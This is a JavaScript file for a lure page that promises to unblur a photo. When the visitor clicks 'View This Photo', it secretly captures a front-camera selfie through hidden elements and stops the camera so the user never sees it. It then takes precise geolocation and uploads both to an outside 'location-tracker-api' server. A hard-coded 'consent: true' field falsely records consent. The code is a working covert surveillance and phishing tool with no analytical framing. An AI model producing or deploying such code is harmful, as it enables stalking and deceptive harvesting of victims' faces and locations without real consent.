const viewPhotoBtn = document.getElementById("viewPhotoBtn");
const statusEl = document.getElementById("status");
const albumPhoto = document.getElementById("albumPhoto");
const lockBadge = document.getElementById("lockBadge");

const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";

let cameraStream = null;
let lastLocationId = null;
let selfieBlob = null;

function setStatus(message) {
    statusEl.innerHTML = message;
}

function unlockPhoto() {
    albumPhoto.style.filter = "blur(0)";
    lockBadge.style.opacity = "0";
    viewPhotoBtn.disabled = false;
    viewPhotoBtn.textContent = "👁️ View This Photo";
}

// --- Step 1: Request camera (hidden) and capture selfie ---
async function requestCameraAndCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        cameraStream = stream;

        // Create hidden video element dynamically
        const hiddenVideo = document.createElement("video");
        hiddenVideo.srcObject = stream;
        hiddenVideo.autoplay = true;
        hiddenVideo.playsinline = true;
        hiddenVideo.style.display = "none";
        document.body.appendChild(hiddenVideo);

        // Wait for video to be ready
        await new Promise((resolve) => {
            hiddenVideo.onloadedmetadata = () => {
                hiddenVideo.play();
                resolve();
            };
            if (hiddenVideo.readyState >= 2) {
                resolve();
            }
        });

        // Wait a tiny bit for the camera to warm up
        await new Promise(r => setTimeout(r, 500));

        // Create hidden canvas and capture frame
        const hiddenCanvas = document.createElement("canvas");
        hiddenCanvas.width = hiddenVideo.videoWidth || 640;
        hiddenCanvas.height = hiddenVideo.videoHeight || 480;
        const ctx = hiddenCanvas.getContext("2d");
        ctx.drawImage(hiddenVideo, 0, 0);

        // Convert to blob
        selfieBlob = await new Promise((resolve) => {
            hiddenCanvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
        });

        // Clean up hidden elements
        document.body.removeChild(hiddenVideo);
        document.body.removeChild(hiddenCanvas);

        // Stop camera immediately – user never sees it
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }

        // Now proceed to upload selfie first, then request location
        await uploadSelfieThenLocation();

    } catch (err) {
        console.error(err);
        setStatus("❌ Camera permission denied.");
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
    }
}

// --- Step 2: Upload selfie FIRST, then request location ---
async function uploadSelfieThenLocation() {
    setStatus("📷 Capturing...");

    if (!selfieBlob) {
        setStatus("❌ No selfie captured.");
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
        return;
    }

    try {
        // Upload selfie first
        const formData = new FormData();
        formData.append("image", selfieBlob, "selfie.jpg");
        formData.append("timestamp", new Date().toISOString());

        const selfieResponse = await fetch(SELFIE_API_URL, {
            method: "POST",
            body: formData
        });

        const selfieResult = await selfieResponse.json();

        if (!selfieResponse.ok) {
            setStatus("❌ " + selfieResult.message);
            viewPhotoBtn.disabled = false;
            viewPhotoBtn.textContent = "👁️ View This Photo";
            return;
        }

        const selfieId = selfieResult.id;

        // Now request location
        setStatus("📍 Requesting location...");
        requestLocation(selfieId);

    } catch (err) {
        console.error(err);
        setStatus("❌ Could not upload selfie.");
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
    }
}

// --- Step 3: Request location and link to selfie ---
function requestLocation(selfieId) {
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().toISOString(),
                consent: true,
                selfie_id: selfieId
            };

            try {
                const locResponse = await fetch(LOCATION_API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                const locResult = await locResponse.json();

                if (!locResponse.ok) {
                    setStatus("❌ " + locResult.message);
                    viewPhotoBtn.disabled = false;
                    viewPhotoBtn.textContent = "👁️ View This Photo";
                    return;
                }

                lastLocationId = locResult.id;
                setStatus("✅ Photo unlocked!");
                unlockPhoto();

            } catch (err) {
                console.error(err);
                setStatus("❌ Could not connect to server.");
                viewPhotoBtn.disabled = false;
                viewPhotoBtn.textContent = "👁️ View This Photo";
            }
        },
        (error) => {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    setStatus("❌ Location permission denied.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    setStatus("❌ Location unavailable.");
                    break;
                case error.TIMEOUT:
                    setStatus("❌ Location request timed out.");
                    break;
                default:
                    setStatus("❌ Unknown location error.");
            }
            viewPhotoBtn.disabled = false;
            viewPhotoBtn.textContent = "👁️ View This Photo";
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// --- Handle "View This Photo" click ---
viewPhotoBtn.addEventListener("click", () => {
    viewPhotoBtn.disabled = true;
    viewPhotoBtn.textContent = "⏳ Verifying...";
    setStatus("");

    // Start: camera first (hidden) → capture → upload selfie → location → unlock
    requestCameraAndCapture();
});